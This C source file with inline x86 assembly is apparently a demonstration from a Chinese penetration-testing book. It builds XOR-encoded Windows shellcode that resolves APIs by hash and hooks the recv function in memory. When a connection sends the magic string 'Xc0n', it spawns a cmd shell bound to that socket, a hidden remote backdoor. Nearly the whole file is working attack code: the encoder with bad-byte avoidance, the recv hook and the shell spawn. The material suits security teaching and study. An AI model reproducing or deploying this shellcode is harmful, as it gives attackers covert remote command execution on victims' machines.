/* shellcode_hook_recv.c
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  Hook系统的recv调用的shellcode演示
*/

#define PROC_BEGIN __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\
                   __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90
#define PROC_END PROC_BEGIN

unsigned char sh_Buff[1024];
unsigned int  sh_Len;
unsigned int  Enc_key=0x99;

unsigned char decode1[] =
/*
00401004   . /EB 0E         JMP SHORT encode.00401014
00401006   $ |5B            POP EBX
00401007   . |4B            DEC EBX
00401008   . |33C9          XOR ECX,ECX
0040100A   . |B1 FF         MOV CL,0FF
0040100C   > |80340B 99     XOR BYTE PTR DS:[EBX+ECX],99
00401010   .^|E2 FA         LOOPD SHORT encode.0040100C
00401012   . |EB 05         JMP SHORT encode.00401019
00401014   > \E8 EDFFFFFF   CALL encode.00401006
*/
"\xEB\x0E\x5B\x4B\x33\xC9\xB1"
"\xFF"          // shellcode size
"\x80\x34\x0B"
"\x99"          // xor byte
"\xE2\xFA\xEB\x05\xE8\xED\xFF\xFF\xFF";

unsigned 
char decode2[] =
/* ripped from eyas
00406030   /EB 10           JMP SHORT 00406042
00406032   |5B              POP EBX
00406033   |4B              DEC EBX
00406034   |33C9            XOR ECX,ECX
00406036   |66:B9 6601      MOV CX,166
0040603A   |80340B 99       XOR BYTE PTR DS:[EBX+ECX],99
0040603E  ^|E2 FA           LOOPD SHORT 0040603A
00406040   |EB 05           JMP SHORT 00406047
00406042   \E8 EBFFFFFF     CALL 00406032
*/
"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9"
"\x66\x01"      // shellcode size
"\x80\x34\x0B"
"\x99"          // xor byte
"\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF";

// kernel32.dll functions index
#define _LoadLibraryA           0x00
#define _CreateProcessA         0x04
#define _TerminateProcess       0x08
#define _VirtualProtect         0x0C
#define _Sleep                  0x10
#define _WaitForSingleObject    0x14
// ws2_32.dll functions index
#define _recv                   0x18

#define S_CreateProcessA        0x00
#define S_WaitForSingleObject   0x04
#define S_VirtualProtect        0x08
#define S_recv                  0x0C
#define N_recv                  0x10
#define S_OldProtect            0x14
#define S_NewProtect            0x18
#define S_ret                   0x1C
#define S_socket                0x20
#define S_buff                  0x24
#define S_eax                   0x28

// functions number
#define _Knums                  6
#define _Wnums                  1

// Need functions
unsigned char functions[100][128] =
{
    // kernel32
    {"LoadLibraryA"},
    {"CreateProcessA"},
    {"TerminateProcess"},
    {"VirtualProtect"},
    {"Sleep"},
    {"WaitForSingleObject"},
    // ws2_32
    {"recv"},
    {""},
};

void PrintSc(unsigned char *lpBuff, int buffsize);
void ShellCode();

// Get function hash
unsigned long hash(unsigned char *c)
{
    unsigned long h=0;
    while(*c)
    {
        h = ( ( h << 25 ) | ( h >> 7 ) ) + *c++;
    }
    return h;
}

// get shellcode
void GetShellCode()
{
    char  *fnbgn_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    char  *fnend_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    unsigned char  *pSc_addr;
    unsigned char  pSc_Buff[1024];
    unsigned int   MAX_Sc_Len=0x2000;
    unsigned long  dwHash[100];
    unsigned int   dwHashSize;

    int l,i,j,k;

    // Get functions hash
    for (i=0;;i++) {
        if (functions[i][0] == '\x0') break;

        dwHash[i] = hash(functions[i]);
        //fprintf(stderr, "%.8X\t%s\n", dwHash[i], functions[i]);
    }
    dwHashSize = i*4;

    // Deal with shellcode
    pSc_addr = (unsigned char *)ShellCode;

    for (k=0;k<MAX_Sc_Len;++k ) {
        if(memcmp(pSc_addr+k,fnbgn_str, 8)==0) {
            break;
        }
    }
    pSc_addr+=(k+8);   // start of the ShellCode
    
    for (k=0;k<MAX_Sc_Len;++k) {
        if(memcmp(pSc_addr+k,fnend_str, 8)==0) {
            break;
        }
    }
    sh_Len=k; // length of the ShellCode
    
    memcpy(pSc_Buff, pSc_addr, sh_Len);

    // Add functions hash
    memcpy(pSc_Buff+sh_Len, (unsigned char *)dwHash, dwHashSize);
    sh_Len += dwHashSize;

    //printf("%d bytes shellcode\n", sh_Len);
    // print shellcode
    //PrintSc(pSc_Buff, sh_Len);

    // find xor byte
    for(i=0xff; i>0; i--)
    {
        l = 0;
        for(j=0; j<sh_Len; j++)
        {
            if ( 
//                   ((pSc_Buff[j] ^ i) == 0x26) ||    //%
//                   ((pSc_Buff[j] ^ i) == 0x3d) ||    //=
//                   ((pSc_Buff[j] ^ i) == 0x3f) ||    //?
//                   ((pSc_Buff[j] ^ i) == 0x40) ||    //@
                   ((pSc_Buff[j] ^ i) == 0x00) ||
//                   ((pSc_Buff[j] ^ i) == 0x0D) ||
//                   ((pSc_Buff[j] ^ i) == 0x0A) ||
                   ((pSc_Buff[j] ^ i) == 0x5C)
                )
            {
                l++;
                break;
            };
        }

        if (l==0)
        {
            Enc_key = i;
            //printf("Find XOR Byte: 0x%02X\n", i);
            for(j=0; j<sh_Len; j++)
            {
                pSc_Buff[j] ^= Enc_key;
            }

            break;                        // break when found xor byte
        }
    }

    // No xor byte found
    if (l!=0){
        //fprintf(stderr, "No xor byte found!\n");

        sh_Len  = 0;
    }
    else {
        //fprintf(stderr, "Xor byte 0x%02X\n", Enc_key);

        // encode
        if (sh_Len > 0xFF) {
            *(unsigned short *)&decode2[8] = sh_Len;
            *(unsigned char *)&decode2[13] = Enc_key;

            memcpy(sh_Buff, decode2, sizeof(decode2)-1);
            memcpy(sh_Buff+sizeof(decode2)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode2)-1;
        }
        else {
            *(unsigned char *)&decode1[7]  = sh_Len;
            *(unsigned char *)&decode1[11] = Enc_key;

            memcpy(sh_Buff, decode1, sizeof(decode1)-1);
            memcpy(sh_Buff+sizeof(decode1)-1, pSc_Buff, sh_Len);
            sh_Len += sizeof(decode1)-1;
        }
    }
}

// print shellcode
void PrintSc(unsigned char *lpBuff, int buffsize)
{
    int i,j;
    char *p;
    char msg[4];
    fprintf(stderr, "/* %d bytes */\n",buffsize);
    for(i=0;i<buffsize;i++)
    {
        if((i%16)==0)
            if(i!=0)
                fprintf(stderr, "\"\n\"");
            else
                fprintf(stderr, "\"");
        sprintf(msg,"\\x%.2X",lpBuff[i]&0xff);
        for( p = msg, j=0; j < 4; p++, j++ )
        {
            if(isupper(*p))
                fprintf(stderr, "%c", _tolower(*p));
            else
                fprintf(stderr, "%c", p[0]);
        }
    }
    fprintf(stderr, "\";\n");
}

// shellcode function
void ShellCode()
{
       __asm{
       
PROC_BEGIN    //C macro to begin proc

        jmp     locate_addr
func_start:
        pop     edi                             ; get eip
        mov     eax, fs:30h
        mov     eax, [eax+0Ch]
        mov     esi, [eax+1Ch]
        lodsd
        mov     ebp, [eax+8]                    ; base address of kernel32.dll
        mov     esi, edi
        push    _Knums
        pop     ecx
        
        GetKFuncAddr:                           ; find functions from kernel32.dll
        call    find_hashfunc_addr
        loop    GetKFuncAddr
        
        push    3233h
        push    5F327377h                       ; ws2_32
        push    esp
        call    dword ptr [esi+_LoadLibraryA]
        mov     ebp, eax                        ; base address of ws2_32.dll
        push    _Wnums
        pop     ecx
        
        GetWFuncAddr:                           ; find functions from ws2_32.dll
        call    find_hashfunc_addr
        loop    GetWFuncAddr
        
hook_recv:
        push    0x7ffdf250
        pop     ebx
        push    dword ptr [esi+_CreateProcessA]
        pop     dword ptr [ebx+S_CreateProcessA]
        push    dword ptr [esi+_recv]
        pop     dword ptr [ebx+S_recv]
        push    dword ptr [esi+_VirtualProtect]
        pop     dword ptr [ebx+S_VirtualProtect]
        push    dword ptr [esi+_WaitForSingleObject]
        pop     dword ptr [ebx+S_WaitForSingleObject]
        jmp     new_recv
    new_recv_addr:
        pop     dword ptr [ebx+N_recv]
        
        lea     eax, [ebx+S_OldProtect]
        push    eax
        push    0x00000040                      ; PAGE_EXECUTE_READWRITE
        push    5
        push    dword ptr [ebx+S_recv]
        call    dword ptr [ebx+S_VirtualProtect]
        
        mov     edi, dword ptr [ebx+S_recv]
        mov     byte ptr [edi], 0xE9
        mov     eax, dword ptr [ebx+N_recv]
        sub     eax, edi
        sub     eax, 5
        inc     edi
        stosd
        
        lea     eax, [ebx+S_NewProtect]
        push    eax
        push    dword ptr [ebx+S_OldProtect]
        push    5
        push    dword ptr [ebx+S_recv]
        call    dword ptr [ebx+S_VirtualProtect]

        push    0xFFFFFFFF
        call    dword ptr [esi+_Sleep]
        
new_recv:
        call    new_recv_addr
        
        push    0x7ffdf250
        pop     ebx
        
        pop     dword ptr [ebx+S_ret]
        pop     dword ptr [ebx+S_socket]
        pop     dword ptr [ebx+S_buff]
        push    dword ptr [ebx+S_buff]
        push    dword ptr [ebx+S_socket]
        
        lea     eax, [ebx+S_OldProtect]
        push    eax
        push    0x00000040                      ; PAGE_EXECUTE_READWRITE
        push    5
        push    dword ptr [ebx+S_recv]
        call    dword ptr [ebx+S_VirtualProtect]
        
        mov     edi, dword ptr [ebx+S_recv]
        mov     dword ptr [edi], 0x83EC8B55
        mov     byte ptr [edi+4], 0xEC          ; restore recv function
        
        lea     eax, [ebx+S_NewProtect]
        push    eax
        push    dword ptr [ebx+S_OldProtect]
        push    5
        push    dword ptr [ebx+S_recv]
        call    dword ptr [ebx+S_VirtualProtect]
        
        call    dword ptr [ebx+S_recv]          ; real recv

        mov     dword ptr [ebx+S_eax], eax
        
        lea     eax, [ebx+S_OldProtect]
        push    eax
        push    0x00000040                      ; PAGE_EXECUTE_READWRITE
        push    5
        push    dword ptr [ebx+S_recv]
        call    dword ptr [ebx+S_VirtualProtect]
        
        mov     edi, dword ptr [ebx+S_recv]
        mov     byte ptr [edi], 0xE9
        mov     eax, dword ptr [ebx+N_recv]
        sub     eax, edi
        sub     eax, 5
        inc     edi
        stosd
        
        lea     eax, [ebx+S_NewProtect]
        push    eax
        push    dword ptr [ebx+S_OldProtect]
        push    5
        push    dword ptr [ebx+S_recv]
        call    dword ptr [ebx+S_VirtualProtect]

        cmp     dword ptr [ebx+S_eax], 4
        jne     new_recv_finish
        mov     eax, dword ptr [ebx+S_buff]
        cmp     dword ptr [eax], 6E306358h  ; recieve "Xc0n"?
        ;cmp     dword ptr [eax], 0x0A306358  ; recieve "Xc0"?
        jne     new_recv_finish

        sub     esp, 54h
        mov     edi, esp
        xor     eax, eax
        push    14h
        pop     ecx

        stack_zero1:
        mov     [edi+ecx*4], eax
        loop    stack_zero1
        
        mov     edx, dword ptr [ebx+S_socket]

        mov     byte ptr [edi+10h], 44h
        inc     byte ptr [edi+3Ch]
        inc     byte ptr [edi+3Dh]
        mov     [edi+48h], edx
        mov     [edi+4Ch], edx
        mov     [edi+50h], edx
        lea     eax, [edi+10h]
        push    646D63h                         ; "cmd"
        mov     edx, esp

        push    edi                             ; pi
        push    eax                             ; si
        push    ecx
        push    ecx
        push    ecx
        push    1
        push    ecx
        push    ecx
        push    edx                             ; "cmd"
        push    ecx
        call    dword ptr [ebx+S_CreateProcessA]
        
        add     esp, 58h
        
        xor     eax, eax
        dec     eax
        push    eax
        push    dword ptr [edi]
        call    dword ptr [ebx+S_WaitForSingleObject]

new_recv_finish:
        mov     eax, dword ptr [ebx+S_eax]
        mov     edx, dword ptr [ebx+S_ret]
        jmp     edx

find_hashfunc_addr:
        push    ecx
        push    esi
        mov     esi, [ebp+3Ch]                  ; e_lfanew
        mov     esi, [esi+ebp+78h]              ; ExportDirectory RVA
        add     esi, ebp                        ; rva2va
        push    esi
        mov     esi, [esi+20h]                  ; AddressOfNames RVA
        add     esi, ebp                        ; rva2va
        xor     ecx, ecx
        dec     ecx
        
        find_start:
        inc     ecx
        lodsd
        add     eax, ebp
        xor     ebx, ebx
        
        hash_loop:
        movsx   edx, byte ptr [eax]
        cmp     dl, dh
        jz      short find_addr
        ror     ebx, 7                          ; hash
        add     ebx, edx
        inc     eax
        jmp     short hash_loop
     
        find_addr:
        cmp     ebx, [edi]                      ; compare to hash
        jnz     short find_start
        pop     esi                             ; ExportDirectory
        mov     ebx, [esi+24h]                  ; AddressOfNameOrdinals RVA
        add     ebx, ebp                        ; rva2va
        mov     cx, [ebx+ecx*2]                 ; FunctionOrdinal
        mov     ebx, [esi+1Ch]                  ; AddressOfFunctions RVA
        add     ebx, ebp                        ; rva2va
        mov     eax, [ebx+ecx*4]                ; FunctionAddress RVA
        add     eax, ebp                        ; rva2va
        stosd                                   ; function address save to [edi]
        pop     esi
        pop     ecx
        retn

        locate_addr:
        call    func_start

PROC_END      //C macro to end proc

        }

}